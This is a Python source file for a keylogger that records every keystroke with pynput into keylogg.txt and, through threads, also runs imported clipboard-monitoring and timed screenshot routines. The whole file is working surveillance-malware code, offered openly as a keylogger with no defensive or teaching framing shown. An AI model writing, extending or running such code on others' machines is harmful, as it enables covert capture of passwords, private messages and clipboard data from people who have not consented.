from pynput import keyboard
import time
import threading
from clipboard_monitor import monitor_clipboard
from screen_shot import screenShot
from set_time import monitor_time

# Global variables for keylogger
keylogg = ""

def on_release(key):
    global keylogg, start_time, set_time
    
    current_time = time.time()
    elapsed_time = current_time - start_time
    
    if elapsed_time <= set_time:  # Continue capturing keys if less than set_time seconds have passed
        try:
            if key == keyboard.Key.enter:
                keylogg += "\n"
            elif key == keyboard.Key.tab:
                keylogg += "\t"
            elif key == keyboard.Key.space:
                keylogg += " "
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.backspace and len(keylogg) == 0:
                pass
            elif key == keyboard.Key.backspace and len(keylogg) > 0:
                keylogg = keylogg[:-1]
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                pass
            else:
                keylogg += key.char 
        except AttributeError:
            pass
        
        # Write to file after each key press
        with open("keylogg.txt", 'a', encoding='utf-8') as logFile:
            logFile.write(keylogg)
            keylogg = ""  # Clear keylogg after writing to file
    else:
        return False  # Stop listener after set_time seconds

    # Additional check to stop after set_time seconds if using 'return False' doesn't work in your version
    if elapsed_time > set_time:
        return False

def keylogger_thread():
    global start_time
    start_time = time.time()

    with keyboard.Listener(on_release=on_release) as listener:
        time.sleep(set_time)  # Wait for set_time seconds
        listener.stop()

if __name__ == "__main__":
    set_time,interval = monitor_time()  # Set the time limit for keylogging
    print(interval)
    # Create a thread for keylogger
    keylogger_thread = threading.Thread(target=keylogger_thread)
    
    # Create a thread for clipboard monitor
    clipboard_thread = threading.Thread(target=monitor_clipboard, args=(set_time,))
    
    # Create a thread for Screen shot
    screenShot_thread = threading.Thread(target=screenShot, args=(set_time ,interval,))
    
    # Start both threads
    keylogger_thread.start()
    clipboard_thread.start()
    screenShot_thread.start()
    
    # Wait for both threads to finish
    keylogger_thread.join()
    clipboard_thread.join()
    screenShot_thread.join()
    
    # print("Both threads finished. Exiting main program.")
